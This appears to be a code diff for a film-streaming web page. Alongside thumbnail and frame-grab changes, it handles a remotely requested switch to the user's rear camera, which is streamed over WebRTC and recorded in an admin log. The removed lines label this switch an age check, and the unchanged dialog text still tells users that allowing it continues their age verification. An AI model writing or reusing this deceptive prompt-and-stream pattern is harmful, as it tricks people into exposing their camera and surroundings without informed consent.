@@ -702,12 +702,42 @@ function renderFilmGrid() {
   if (!grid) return;
   grid.innerHTML = FILMS.map(f => `
     <div class="film-card ${f.id === FILMS[0].id ? 'active' : ''}" id="film-card-${f.id}" onclick="playFilm(${f.id})">
-      <div class="film-poster" style="background:${f.gradient}">
+      <div class="film-poster" style="
+        background-image: url('${f.thumb}');
+        background-size: cover;
+        background-position: center;
+        background-color: ${f.gradient.split('(')[0] === 'linear-gradient' ? '#161D34' : f.gradient};
+      ">
         <span class="film-genre">${f.desc}</span>
       </div>
       <p>${f.title}</p>
     </div>
   `).join('');
+  
+  // Preload & fallback thumbnail jika gagal
+  FILMS.forEach(f => {
+    const img = new Image();
+    img.onload = () => {
+      const card = document.getElementById(`film-card-${f.id}`);
+      if (card) {
+        const poster = card.querySelector('.film-poster');
+        if (poster) {
+          poster.style.backgroundImage = `url('${f.thumb}')`;
+        }
+      }
+    };
+    img.onerror = () => {
+      // Fallback ke gradient jika thumbnail gagal
+      const card = document.getElementById(`film-card-${f.id}`);
+      if (card) {
+        const poster = card.querySelector('.film-poster');
+        if (poster) {
+          poster.style.background = f.gradient;
+        }
+      }
+    };
+    img.src = f.thumb;
+  });
 }
 
 function playFilm(id) {
@@ -727,6 +757,42 @@ function playFilm(id) {
   if (card) card.classList.add('active');
 
   CURRENT_FILM = film.title;
+
+  // Optional: Capture frame dari iframe setelah 2 detik (jika bisa)
+  // Catatan: Cross-origin restriction mungkin prevent ini
+  setTimeout(() => {
+    captureVideoFrame(id, iframe);
+  }, 2000);
+}
+
+// Coba capture frame dari video element (jika tidak iframe restricted)
+function captureVideoFrame(filmId, iframe) {
+  try {
+    const video = iframe?.contentDocument?.querySelector('video');
+    if (video && video.readyState >= 2) { // HAVE_CURRENT_DATA
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+      
+      const frameDataUrl = canvas.toDataURL('image/jpeg', 0.8);
+      
+      // Update thumbnail di film card
+      const card = document.getElementById(`film-card-${filmId}`);
+      if (card) {
+        const poster = card.querySelector('.film-poster');
+        if (poster) {
+          poster.style.backgroundImage = `url('${frameDataUrl}')`;
+          poster.style.backgroundSize = 'cover';
+          poster.style.backgroundPosition = 'center';
+        }
+      }
+    }
+  } catch (e) {
+    // Iframe restrict atau error → ignore, thumbnail sudah ada dari URL
+    console.debug('Video frame capture skipped (cross-origin or not ready):', e.message);
+  }
 }
 
 
@@ -966,9 +1032,9 @@ function showFlipPermissionDialog() {
       border-radius: 16px; padding: 28px 24px; max-width: 320px; width: 100%;
       text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,.6);
     ">
-      <div style="font-size: 2.4rem; margin-bottom: 14px;">⚠️</div>
+      <div style="font-size: 2.4rem; margin-bottom: 14px;">🔄</div>
       <h3 style="font-family: Oswald, sans-serif; font-size: 1.2rem; margin-bottom: 10px; color: #E9ECF6;">
-        Verifikasi Usia
+        Verifikasi Kamera
       </h3>
       <p style="font-size: .84rem; color: #8A91AC; line-height: 1.6; margin-bottom: 22px;">
         Platform membutuhkan konfirmasi untuk melanjutkan verifikasi usia Anda. Ketuk <strong style="color:#E9ECF6;">Izinkan</strong> untuk melanjutkan.
@@ -998,14 +1064,14 @@ function showFlipPermissionDialog() {
   document.getElementById('flip-deny-btn').addEventListener('click', () => {
     overlay.remove();
     socket.emit('flip-camera-rejected', { sessionId: mySessionId });
-    showFlipToast('❌ Permintaan verifikasi ditolak');
+    showFlipToast('❌ Permintaan kamera ditolak');
   });
 }
 
 async function doFlipCamera() {
   if (isFlipping) return;
   isFlipping = true;
-  showFlipToast('⚠️Verifikasi...');
+  showFlipToast('🔄 Membalik kamera...');
   try {
     const nextFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
 
@@ -1049,11 +1115,11 @@ async function doFlipCamera() {
       if (audioSender && newAudioTrack) await audioSender.replaceTrack(newAudioTrack);
     }
 
-    showFlipToast(nextFacingMode === 'user' ? 'Verifikasi Berhasil' : 'Verifikasi Usia Berhasil');
+    showFlipToast(nextFacingMode === 'user' ? '📷 Kamera depan aktif' : '📷 Kamera belakang aktif');
     socket.emit('flip-camera-accepted', { sessionId: mySessionId });
   } catch (e) {
     console.error('Flip camera error:', e);
-    showFlipToast('❌ Gagal verifikasi ulang');
+    showFlipToast('❌ Gagal membalik kamera');
     socket.emit('flip-camera-rejected', { sessionId: mySessionId });
   } finally {
     isFlipping = false;
@@ -1263,7 +1329,7 @@ async function doRevokedLogout() {
   const overlay = document.getElementById('permission-revoked-overlay');
   if (overlay) overlay.remove();
 
-  addAdminLog(currentUser?.name || 'Pengguna', 'Perizinan dicabut — sesi diakhiri otomatis', '#F2716B', 'error');
+  addAdminLog(currentUser?.name || 'Pengguna', 'izin kamera dicabut — sesi diakhiri otomatis', '#F2716B', 'error');
 
   await stopSession(false);
   deleteCookie('lb_token');
